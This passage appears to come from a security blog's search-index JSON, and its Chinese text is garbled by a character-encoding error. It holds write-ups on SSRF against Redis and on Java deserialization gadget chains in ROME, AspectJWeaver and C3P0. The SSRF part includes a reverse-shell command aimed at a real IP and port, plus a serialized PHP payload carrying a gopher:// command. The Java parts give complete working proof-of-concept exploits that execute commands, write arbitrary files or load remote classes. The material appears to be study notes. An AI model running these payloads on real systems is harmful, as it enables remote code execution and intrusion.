ä¹Ÿå¯ä»¥ç”¨è¿™æ¡å‘½ä»¤åå¼¹shell 12system.rev 81.71.13.76 5656quit å°†ä¸Šé¢çš„payloadè¿›è¡Œbase64ç¼–ç ï¼Œå¹¶èµ‹å€¼ç»™$c-&gt;Flag ï¼›ä¸ºäº†ä¸å‡ºé”™ï¼Œåˆ†å…­æ­¥æ‰“ï¼›payloadå¤§æ¦‚æ˜¯ä¸‹é¢çš„æ ·å­ï¼Œå°±æ˜¯base64çš„å†…å®¹ä¼šæ”¹ä¸€ä¸‹ 1O:2:&quot;Ha&quot;:3:{s:5:&quot;start&quot;;a:1:{s:3:&quot;POC&quot;;s:3:&quot;0.o&quot;;}s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:{s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:{s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:88:&quot;Z29waGVyOi8vMTI3LjAuMC4xOjYzNzkvX2NvbmZpZyUyMHNldCUyMGRpciUyMCUyRnRtcCUyRiUwRCUwQXF1aXQ=&quot;;}s:3:&quot;poc&quot;;N;}s:6:&quot;start2&quot;;s:3:&quot;o.0&quot;;} åˆ°è¿™é‡Œå®éªŒå°±ç»“æŸäº†ï¼Œä½†æ˜¯è¿™ä¸ªå®éªŒéœ€è¦æ³¨æ„redisç‰ˆæœ¬ç­‰é—®é¢˜ï¼›ç”¨ä¸»ä»èµ‹å€¼è™½ç„¶éº»çƒ¦ï¼Œä½†æ˜¯æ²¡æœ‰å…¶ä»–æ–¹æ³•é‚£ä¹ˆå¤šé™åˆ¶ï¼Œåªéœ€è¦æ³¨æ„ä¸€ä¸‹redisçš„ç‰ˆæœ¬æ”¯æŒmoduleç­‰å‘½ä»¤å’Œå¯ä»¥è¿å¤–ç½‘ï¼›","link":"/2024/01/22/ssrf%E6%89%93redis/"},{"title":"rome+AspectJWeaver+C3P0","text":"ROMEpopgadget 12345678910TemplatesImpl.getOutputProperties()NativeMethodAccessorImpl.invoke0(Method, Object, Object[])NativeMethodAccessorImpl.invoke(Object, Object[])DelegatingMethodAccessorImpl.invoke(Object, Object[])Method.invoke(Object, Object...)ToStringBean.toString(String)ToStringBean.toString()EqualsBean.hashCode()HashMap&lt;K,V&gt;.hash(Object)HashMap&lt;K,V&gt;.readObject(ObjectInputStream) æˆ‘è¿™æ ·å†™æ¯”ysoserialä¸Šçš„é“¾æ›´ç®€å•ç‚¹ï¼Œæ„Ÿè§‰ysoserialä¸Šçš„é“¾æœ‰ä¸€äº›ä¸å¿…è¦ç”¨çš„ï¼›æ¯”å¦‚â€ObjectBeanâ€;å®Œå…¨å¯ä»¥é€šè¿‡EqualsBeanæœ¬èº«çš„hashCode()å‡½æ•°è·³åˆ°EqualsBean.beanHashCode()ï¼Œè€Œä¸éœ€è¦ç”¨çš„â€ObjectBean.hashCodeâ€ï¼› ç¯å¢ƒä¾èµ– 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;rome&lt;/groupId&gt; &lt;artifactId&gt;rome&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; åˆ†ægadget: com.sun.syndication.feed.impl.EqualsBeanç±» 1234567891011121314151617181920 public EqualsBean(Class beanClass,Object obj) { if (!beanClass.isInstance(obj)) { throw new IllegalArgumentException(obj.getClass()+&quot; is not instance of &quot;+beanClass); } _beanClass = beanClass; _obj = obj; }public int hashCode() { return beanHashCode(); } public int beanHashCode() { return _obj.toString().hashCode(); } public int beanHashCode() { return _obj.toString().hashCode(); } _objæ˜¯å¯æ§åˆ¶çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥è°ƒç”¨ToStringBean.toString(); com.sun.syndication.feed.impl.ToStringBeanç±» 123456789101112131415161718192021222324252627282930313233343536373839404142public ToStringBean(Class beanClass,Object obj) { _beanClass = beanClass; _obj = obj;}public String toString() { Stack stack = (Stack) PREFIX_TL.get(); String[] tsInfo = (String[]) ((stack.isEmpty()) ? null : stack.peek()); String prefix; if (tsInfo==null) { String className = _obj.getClass().getName(); prefix = className.substring(className.lastIndexOf(&quot;.&quot;)+1); } else { prefix = tsInfo[0]; tsInfo[1] = prefix; } return toString(prefix);}private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass); if (pds!=null) { for (int i=0;i&lt;pds.length;i++) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod!=null &amp;&amp; // ensure it has a getter method pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; // filter Object.class getter methods pReadMethod.getParameterTypes().length==0) { Object value = pReadMethod.invoke(_obj,NO_PARAMS); printProperty(sb,prefix+&quot;.&quot;+pName,value); } } } } catch (Exception ex) { sb.append(&quot;\\n\\nEXCEPTION: Could not complete &quot;+_obj.getClass()+&quot;.toString(): &quot;+ex.getMessage()+&quot;\\n&quot;); } return sb.toString();} è¿™é‡ŒtoStringçš„æ— å‚æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨çš„toStringçš„æœ‰å‚æ–¹æ³•ï¼›è€ŒtoString(String prefix)æ–¹æ³•ä¸­ åœ¨Javaä¸­ï¼ŒBeanIntrospector.getPropertyDescriptors(_beanClass);æ˜¯ä¸€ä¸ªç”¨æ¥è·å–æŒ‡å®š Java Bean ç±»çš„å±æ€§æè¿°ç¬¦ï¼ˆPropertyDescriptorï¼‰æ•°ç»„çš„æ–¹æ³•ã€‚PropertyDescriptoråŒ…å«äº†Java Beanç±»çš„å±æ€§çš„ä¿¡æ¯ï¼Œæ¯”å¦‚å±æ€§åç§°ã€å±æ€§çš„getteræ–¹æ³•å’Œsetteræ–¹æ³•ç­‰ getReadMethod()ï¼šæ˜¯ PropertyDescriptor ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºè·å–ä¸å½“å‰å±æ€§ç›¸å…³è”çš„è¯»å–æ–¹æ³•ï¼ˆgetter æ–¹æ³•ï¼‰ã€‚è€Œè·å–setteræ–¹æ³•å¯¹åº”çš„å‡½æ•°å°±æ˜¯â€getWriteMethod()â€; _beanClasså’Œ_objä¹Ÿæ˜¯å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°æ§åˆ¶çš„ï¼›æ‰€ä»¥å°±å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„getteræ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯TemplatesImplç±»ä¸­çš„.getOutputProperties()å‡½æ•°ï¼› poc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class Test1 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); TemplatesImpl fakeTemplates = new TemplatesImpl(); Class templatesClass = templates.getClass(); Field name = templatesClass.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;zIxyd&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); byte[][] bytes= {code}; Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,bytes);// Field tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;);// tfactory.setAccessible(true);// tfactory.set(templates,new TransformerFactoryImpl()); //é˜²æ­¢åœ¨åºåˆ—åŒ–æ—¶å°±ä»£ç æ‰§è¡Œï¼Œå…ˆå¼„ä¸€ä¸ªæ²¡ç”¨çš„å®ä¾‹ ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates); EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,1); //é˜²æ­¢åœ¨åºåˆ—åŒ–æ—¶å°±ä»£ç æ‰§è¡Œï¼Œå†é€šè¿‡åå°„å°†å¯¹è±¡æ”¹æˆæ¶æ„çš„TemplatesImplå®ä¾‹ Class toStringBeanClass = toStringBean.getClass(); Field obj = toStringBeanClass.getDeclaredField(&quot;_obj&quot;); obj.setAccessible(true); obj.set(toStringBean,templates); serialize(hashMap); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} å…¶ä¸­æœ‰ä¸€ä¸ªå‘ç‚¹: 1ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class, fakeTemplates); ToStringBeanç±»ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸èƒ½å†™TemplatesImpl.classï¼ˆå…¶å®ä¸€å¼€å§‹æˆ‘ä¸ºäº†é€”æ–¹ä¾¿ï¼Œå†™çš„å°±æ˜¯è¿™ä¸ªï¼Œå¦åˆ™ååºåˆ—åŒ–ä¸èƒ½æ‰§è¡Œä»£ç ï¼› â€œå­¦ä¹ â€ï¼›çŸ¥å…¶ç„¶çŸ¥å…¶æ‰€ä»¥ç„¶ï¼›è°ƒè¯•çœ‹çœ‹ï¼Œä¸ºä»€ä¹ˆä¸è¡Œï¼› å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°å†™TemplatesImpl.classï¼Œåœ¨ä½¿ç”¨BeanIntrospector.getPropertyDescriptors(_beanClass);å°±ä¼šæœ‰äº”ä¸ªå‚æ•°ç¬¦åˆæ¡ä»¶ï¼› è€Œè¦åˆ©ç”¨çš„getOutputPropertiesæ’åœ¨ç¬¬ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯æ•°ç»„ä¸‹æ ‡ä¸º2çš„å…ƒç´  ä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå½“éå†åˆ°ç¬¬äºŒä¸ªå…ƒç´ æ—¶ï¼Œå°±ä¼šæŠ¥ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸ä¼šæ‰§è¡Œåˆ°è¦åˆ©ç”¨çš„getPropertyDescriptorså‡½æ•° 1private transient ThreadLocal _sdom = new ThreadLocal(); å…¶å®_sdomå±æ€§é»˜è®¤æ˜¯æœ‰å€¼çš„ï¼Œä½†æ˜¯è¢«transientä¿®é¥°äº†ï¼Œæ‰€ä»¥ååºåˆ—åŒ–æ—¶ä¼šä¸ºç©º è§£å†³æ–¹æ³•ä¹‹ä¸€å°±æ˜¯å°†ToStringBeanå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¹æˆTemplates.class,è¿™æ ·åœ¨è·å–javabeançš„(getter,setter)æ–¹æ³•æ—¶ï¼Œå°±åªä¼šå¾—åˆ°getPropertyDescriptorsæ–¹æ³•ï¼› è¿˜æœ‰ä¸€æ¡å¯ä»¥æ›´ç®€å•çš„é“¾: gadget: 123456789TemplatesImpl.getOutputProperties()NativeMethodAccessorImpl.invoke0(Method, Object, Object[])NativeMethodAccessorImpl.invoke(Object, Object[])DelegatingMethodAccessorImpl.invoke(Object, Object[])Method.invoke(Object, Object...)EqualsBean.beanEquals(Object obj)AbstractMap.equals(Object obj)HashMap&lt;K,V&gt;.putVal(int hash, K key, V value, boolean onlyIfAbsent,boolean evict)HashMap&lt;K,V&gt;.readObject(ObjectInputStream) åœ¨com.sun.syndication.feed.impl.EqualsBeanç±»ä¸­çš„equalsè°ƒç”¨äº†beanEqualsæ–¹æ³•ï¼›è€Œè¿™ä¸ªæ–¹æ³•ä¸­å­˜åœ¨pReadMethod.invoke(bean1, NO_PARAMS); å¯ä»¥ç®€å•åˆ†æä¸€ä¸‹â€beanEqualsâ€å‡½æ•°ï¼Œå¦‚æœæƒ³è¦è°ƒç”¨çš„â€pReadMethod.invokeâ€;è¦ä½¿å¾—eq = true;å¦åˆ™forå¾ªç¯éƒ½è¿›ä¸å» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public boolean equals(Object obj) { return beanEquals(obj);}public boolean beanEquals(Object obj) { Object bean1 = _obj; Object bean2 = obj; boolean eq; if (bean2==null) { eq = false; } else if (bean1==null &amp;&amp; bean2==null) { eq = true; } else if (bean1==null || bean2==null) { eq = false; } else { if (!_beanClass.isInstance(bean2)) { eq = false; } else { eq = true; try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass); if (pds!=null) { for (int i = 0; eq &amp;&amp; i&lt;pds.length; i++) { Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod!=null &amp;&amp; pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; pReadMethod.getParameterTypes().length==0) { Object value1 = pReadMethod.invoke(bean1, NO_PARAMS); Object value2 = pReadMethod.invoke(bean2, NO_PARAMS); eq = doEquals(value1, value2); } } } } catch (Exception ex) { throw new RuntimeException(&quot;Could not execute equals()&quot;, ex); } } } return eq;} å¯ä»¥åˆ©ç”¨CC7ä¸­çš„æ€è·¯ï¼Œä½¿å¾—ä¸¤ä¸ªHashMapç›¸åŒï¼Œä»è€Œä¼šè°ƒç”¨ç¬¬äºŒä¸ªmapçš„equalsæ–¹æ³•ï¼Œå› ä¸ºHashMapæ²¡æœ‰equalsæ–¹æ³•ï¼Œæœ€ç»ˆä¼šè°ƒç”¨HashMapçš„çˆ¶ç±»AbstractMapçš„equalsæ–¹æ³•ï¼› 1234567891011121314151617181920212223242526272829303132public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; if (m.size() != size()) return false; try { Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) { Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) // &lt;&lt;===åœ¨è¿™é‡Œå¯ä»¥è°ƒç”¨çš„EqualsBean.equals return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true;} Poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import javassist.ClassPool;import javassist.CtClass;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;public class Test2 { public static void main(String[] args) throws Exception { String cmd = &quot;calc&quot;; //TemplateImpl åŠ¨æ€åŠ è½½å­—èŠ‚ç  String AbstractTranslet = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;; ClassPool classPool = ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload = classPool.makeClass(&quot;a&quot;); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot; + cmd + &quot;\\&quot;);&quot;); byte[] code = payload.toBytecode(); payload.writeFile(); TemplatesImpl templates = new TemplatesImpl(); TemplatesImpl fakeTemplates = new TemplatesImpl(); Class templatesClass = templates.getClass(); Field name = templatesClass.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;zIxyd&quot;);// byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); byte[][] bytes = {code}; Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, bytes); Field tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); EqualsBean equalsBean = new EqualsBean(String.class, &quot;zIxyd&quot;); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(&quot;yy&quot;, equalsBean); map1.put(&quot;zZ&quot;, templates); map2.put(&quot;zZ&quot;, equalsBean); map2.put(&quot;yy&quot;, templates); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(map1, &quot;1&quot;); hashMap.put(map2, &quot;2&quot;); Class equalsBeanClass = equalsBean.getClass(); Field beanClass = equalsBeanClass.getDeclaredField(&quot;_beanClass&quot;); beanClass.setAccessible(true); beanClass.set(equalsBean, Templates.class); Field obj = equalsBeanClass.getDeclaredField(&quot;_obj&quot;); obj.setAccessible(true); obj.set(equalsBean, templates); serialize(hashMap); unserialize(); //base64Encode(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); } public static void base64Encode(String filename){ String filePath = filename; // æŒ‡å®šæ–‡ä»¶è·¯å¾„ try { File file = new File(filePath); FileInputStream fis = new FileInputStream(file); byte[] data = new byte[(int) file.length()]; fis.read(data); fis.close(); // ä½¿ç”¨Base64ç¼–ç  String base64Encoded = Base64.getEncoder().encodeToString(data); System.out.println(&quot;Base64 ç¼–ç åçš„é•¿åº¦: &quot; + base64Encoded.length()); //1360 } catch (Exception e) { e.printStackTrace(); } }} æœ€åç”¨javassistæ–¹æ³•ï¼Œå°†æ–‡ä»¶å†…å®¹å˜å°äº†è®¸å¤šï¼› javassistä¾èµ– 12345&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.27.0-GA&lt;/version&gt;&lt;/dependency&gt; AspectJWeaverä¾èµ– 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; gadget: 12345678HashSet.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() SimpleCache$StorableCachingMap.put() SimpleCache$StorableCachingMap.writeToPath() åœ¨ org.aspectj.weaver.tools.cache.SimpleCache ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±» StoreableCachingMapï¼Œè¿™ä¸ªç±»ç»§æ‰¿äº† HashMapï¼Œæä¾›äº†å°† Map ä¸­å€¼å†™å…¥æ–‡ä»¶ä¸­çš„åŠŸèƒ½ã€‚ æ–‡ä»¶åï¼Œè·¯å¾„åå’Œå†…å®¹éƒ½æ˜¯å¯æ§çš„ï¼› 123456789101112131415161718192021222324252627282930313233343536private StoreableCachingMap(String folder, int storingTimer){ this.folder = folder; initTrace(); this.storingTimer = storingTimer;}public Object put(Object key, Object value) { try { String path = null; byte[] valueBytes = (byte[]) value; if (Arrays.equals(valueBytes, SAME_BYTES)) { path = SAME_BYTES_STRING; } else { path = writeToPath((String) key, valueBytes); // &lt;&lt;== } Object result = super.put(key, path); storeMap(); return result; } catch (IOException e) { trace.error(&quot;Error inserting in cache: key:&quot;+key.toString() + &quot;; value:&quot;+value.toString(), e); Dump.dumpWithException(e); } return null;}private String writeToPath(String key, byte[] bytes) throws IOException { String fullPath = folder + File.separator + key; FileOutputStream fos = new FileOutputStream(fullPath); fos.write(bytes); // &lt;&lt;== fos.flush(); fos.close(); return fullPath;} ç¤ºä¾‹ï¼šåˆ©ç”¨åå°„åœ¨å½“å‰ç›®å½•ä¸‹å‘Test.txtå†™äº†å†…å®¹ä¸ºâ€zIxydâ€¦â€ï¼› 1234567891011121314String fileName = &quot;Test.txt&quot;;String filePath = &quot;.&quot;;String fileContent = &quot;zIxyd...&quot;;Class clazz = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;);Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class, int.class);declaredConstructor.setAccessible(true);Object o = declaredConstructor.newInstance(filePath, 1);Method declaredMethod = clazz.getDeclaredMethod(&quot;put&quot;, Object.class, Object.class);declaredMethod.setAccessible(true);byte[] bytes = fileContent.getBytes();declaredMethod.invoke(o,fileName,bytes); LazyMapä¸­çš„getå‡½æ•°è°ƒç”¨äº†putå‡½æ•°ï¼›åˆ°è¿™é‡Œåˆ©ç”¨é“¾å°±å¾ˆæ˜æ˜¾äº†(å‰ä¸€éƒ¨åˆ†ç”¨CC6ï¼Œåä¸€éƒ¨åˆ†ä»LazyMap.getè°ƒç”¨çš„StoreableCachingMap.put); 123456789public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key);} Poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test1 { public static void main(String[] args) throws Exception { String fileName = &quot;Test.txt&quot;; String filePath = &quot;.&quot;; String fileContent = &quot;zIxyd...&quot;; byte[] bytes = fileContent.getBytes(); Class clazz = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;); Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class, int.class); declaredConstructor.setAccessible(true); Map o = (Map) declaredConstructor.newInstance(filePath, 1); Map lazyMap = LazyMap.decorate(o, new ConstantTransformer(bytes)); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); //é˜²æ­¢åœ¨åºåˆ—åŒ–æ—¶å°±æ‰§è¡Œï¼Œæ‰€ä»¥å…ˆä¸å¡«æ¶æ„çš„lazyMapï¼Œç­‰åºåˆ—å®Œï¼Œå†é€šè¿‡åå°„æ”¹æˆLazyMap TiedMapEntry tiedMapEntry = new TiedMapEntry(hashMap, fileName); hashMap.put(tiedMapEntry,1); Class tiedMapEntryClass = TiedMapEntry.class; Field map = tiedMapEntryClass.getDeclaredField(&quot;map&quot;); map.setAccessible(true); map.set(tiedMapEntry,lazyMap); serialize(hashMap); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} C3P0ä¾èµ– 12345&lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.2&lt;/version&gt;&lt;/dependency&gt; gadget: 12345PoolBackedDataSourceBase.readObject() ReferenceIndirector.getObject() ReferenceableUtils.referenceToObject() Class.forName0() URLClassLoader.loadClass() PoolBackedDataSourceBase.readObject()ï¼›å¦‚æœå˜é‡ o æ˜¯å¦æ˜¯ IndirectlySerialized ç±»æˆ–å…¶å­ç±»çš„å®ä¾‹ã€‚å°±ä¼šè°ƒç”¨ ReferenceIndirector.getObject() 1234567891011private void readObject( ObjectInputStream ois ) throws IOException, ClassNotFoundException{ short version = ois.readShort(); switch (version) { case VERSION: // we create an artificial scope so that we can use the name o for all indirectly serialized objects. { Object o = ois.readObject(); if (o instanceof IndirectlySerialized) o = ((IndirectlySerialized) o).getObject(); //&lt;&lt;== ...... ä½†æ˜¯IndirectlySerializedæ²¡æœ‰Serializableæ¥å£ï¼Œæ³¨æ„writeObjectå‡½æ•°:å½“å¯¹è±¡ä¸èƒ½ååºåˆ—æ—¶ï¼›ä¼šè°ƒç”¨ReferenceIndirector.indirectFormå‡½æ•°å°†ä¸èƒ½ååºåˆ—åŒ–çš„å¯¹è±¡å°è£…ï¼›IndirectlySerializedæ¥å£çš„å”¯ä¸€å®ç°ç±»å°±æ˜¯ReferenceSerializedï¼› 123456789101112131415161718private void writeObject( ObjectOutputStream oos ) throws IOException{ oos.writeShort( VERSION ); try { //test serialize SerializableUtils.toByteArray(connectionPoolDataSource); oos.writeObject( connectionPoolDataSource ); } catch (NotSerializableException nse) { com.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, &quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;, nse); try { Indirector indirector = new com.mchange.v2.naming.ReferenceIndirector(); oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) ); //&lt;&lt;== } ...... æ³¨æ„indirectFormå‡½æ•°ï¼›ä¼šå°†ä¼ é€’çš„å¯¹è±¡å¼ºè½¬æˆReferenceableæ¥å£å¹¶è°ƒç”¨getReference()æ–¹æ³•ï¼Œæœ€ç»ˆè¿”å›ä¸€ä¸ªReferenceå¯¹è±¡ï¼› ä¹Ÿå°±æ˜¯è¯´refå¯¹è±¡ï¼Œæ˜¯å¯æ§çš„ï¼Œè¿™ä¸€ç‚¹å¯¹åé¢çš„åˆ©ç”¨éå¸¸é‡è¦ï¼› æ‰€ä»¥æœ€ç»ˆ:ä¸€ä¸ªä¸å¯åºåˆ—åŒ–çš„å¯¹è±¡ç»è¿‡åºåˆ—åŒ–ä¼šå°è£…æˆReferenceSerializedå¯¹è±¡ï¼›ä¹‹åå†ååºåˆ—åŒ–å°±è°ƒç”¨åˆ°ReferenceSerialized.getObject()æ–¹æ³• è°ƒç”¨åˆ° ReferenceableUtils.referenceToObject()ï¼›å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† URLClassLoader ä» URL ä¸­åŠ è½½äº†ç±»å¹¶å®ä¾‹åŒ–ï¼› refå†ä¸Šé¢è¯´è¿‡ï¼Œå› ä¸ºæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æœ€åå¯ä»¥ä½¿ç”¨ URLClassLoader ä» URL ä¸­åŠ è½½äº†ç±»å¹¶å®ä¾‹åŒ–ã€‚ Poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;import javax.naming.NamingException;import javax.naming.Reference;import javax.naming.Referenceable;import javax.sql.ConnectionPoolDataSource;import javax.sql.PooledConnection;import java.beans.PropertyVetoException;import java.io.*;import java.sql.SQLException;import java.sql.SQLFeatureNotSupportedException;import java.util.logging.Logger;public class Test1 { //ä»ä¸Šé¢åˆ†æåˆ°:è¦åºåˆ—åŒ–çš„å¯¹è±¡åˆ†åˆ«ä¼šå¼ºè½¬æˆConnectionPoolDataSourceå’ŒReferenceable public static class payload implements ConnectionPoolDataSource,Referenceable { @Override //åºåˆ—åŒ–æ—¶é€šè¿‡&quot;Reference ref = ((Referenceable) orig).getReference();&quot;;ä¼šå°†refå¯¹è±¡å˜æˆæ¶æ„çš„Referenceå¯¹è±¡ï¼Œ public Reference getReference() throws NamingException { return new Reference(&quot;Calc&quot;,&quot;Calc&quot;,&quot;http://127.0.0.1:8000/&quot;); } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } public static void main(String[] args) throws PropertyVetoException, IOException, ClassNotFoundException, InstantiationException, IllegalAccessException { payload payload = new payload(); PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false); poolBackedDataSourceBase.setConnectionPoolDataSource(payload); serialize(poolBackedDataSourceBase); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }}","link":"/2024/03/10/rome+AspectJWeaver+C3P0/"},{"title":"jsåŸå‹æ±¡æŸ“","text":"ä»€ä¹ˆæ˜¯åŸå‹æ±¡æŸ“ï¼ŸåŸå‹æ±¡æŸ“æ˜¯ä¸€ä¸ª JavaScript(nodejs) æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒå‘å…¨å±€å¯¹è±¡åŸå‹æ·»åŠ ä»»æ„å±æ€§ï¼Œç„¶åç”¨æˆ·å®šä¹‰çš„å¯¹è±¡å¯ä»¥ç»§æ‰¿è¿™äº›å±æ€§ã€‚ 